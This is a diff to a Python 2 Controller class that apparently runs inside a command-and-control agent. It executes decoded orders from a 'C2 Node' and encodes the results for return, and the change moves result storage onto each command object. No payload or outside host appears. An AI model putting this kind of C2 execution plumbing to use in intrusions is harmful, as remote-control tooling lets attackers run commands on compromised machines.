@@ -86,7 +86,6 @@ class Controller:
         This function will fail gracefully. Would rather not execute a badly decoded command than crash the process.
         """
         com_objs = []
-        
         try: 
             if type(data) is list or type(data) is tuple:
                 
@@ -110,6 +109,18 @@ class Controller:
                 print config.COD_PROMPT + " Issue in format while trying to translate to CommandObject %s" % (data)
 
         return com_objs
+    
+    @staticmethod
+    def recursive_retrieve_cmd_results(com_objs):
+
+        agg_results = []
+        for cur_obj in com_objs:
+            if type(cur_obj) is list:
+                results = Controller.recursive_retrieve_cmd_results(cur_obj)
+            else:
+                results = cur_obj.get_results()
+            agg_results.append(results)
+        return agg_results
     
     # ###############    
     # HANDLER BUILDERS
@@ -292,7 +303,6 @@ class Controller:
         """
         type_check = type(command)
         
-        agg_results = []
         success = False
 
         try:
@@ -307,20 +317,15 @@ class Controller:
                 args = command.args
                 print config.CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
                 success, results = cmd_obj.execute(args)
-    
-                cmd_results = {}
-                cmd_results[config.CMD_SUCC_KEY] = success # store if the command was sucecssful or not
-                cmd_results[config.CMD_RES_KEY] = results # store the returned output of the command
-                cmd_results[config.CMD_NAME_KEY] = cmd_obj.name() # store the command name
-                cmd_results[config.CMD_ARGS_KEY] = args # store the argumenst the command was ran with
-                agg_results.append(cmd_results)
+                
+                command.results = results
+                command.success = success
 
             elif type_check is list:
                 print config.CMD_PROMPT + " Beginning Sub Command Chain"
                 for cur_cmd in command:
-                    success, results = self.recursive_execute(cur_cmd)
-                    # not doing anything with success here
-                    agg_results.append(results)
+                    success = self.recursive_execute(cur_cmd)
+
                 print config.CMD_PROMPT + " Finishing Sub Command Chain"
 
                     
@@ -330,26 +335,23 @@ class Controller:
         except Exception, e:
             raise
             
-        return success, agg_results
-    
+        return success
+        
     def handle_command(self, commands):
         """
          Iterates through each commands from the C2 Node's order and executes appropriately.
         """
         print config.CMD_PROMPT + " calling commands..."
         
-        results = []
         success = False
 
         print config.CMD_PROMPT + " Beginning Command Chain"
         for command in commands:
-            success, result = self.recursive_execute(command)
+            success = self.recursive_execute(command)
             # Is there going to be complex results checking and handling code?
-            results.append(result)
-            
-        # check results for threads, if there are, add them to a pool to be tracked
+
         print config.CMD_PROMPT + " Command Chain Completed"
-        return success, results
+        return success
 
     
     def handle_encode(self, results):
@@ -416,17 +418,17 @@ class Controller:
             
             # Process command
             if success:
-                #TODO: Here we should turn tuples, strings, dicts and lists into CommandObjects. Then add these CommandObjects to the Order. 
-                # then hand the Order to the command handler, from there it should
+                #Convert the decoded data string into CommandObjects. 
                 command_objects = Controller.recursive_convert_to_cmd_objects(decoded_data)
                 order.commands = command_objects
-                success, results = self.handle_command(order.commands)
-                order.results = results
+                # pass the command objects by reference into the handler. They should then store the results
+                success = self.handle_command(order.commands)
             else:
                 return False
-            
+
             # encode response here
             if success:
+                results = Controller.recursive_retrieve_cmd_results(order.commands)
                 success, encoded_results = self.handle_encode(results)
                 order.response = encoded_results
             else:
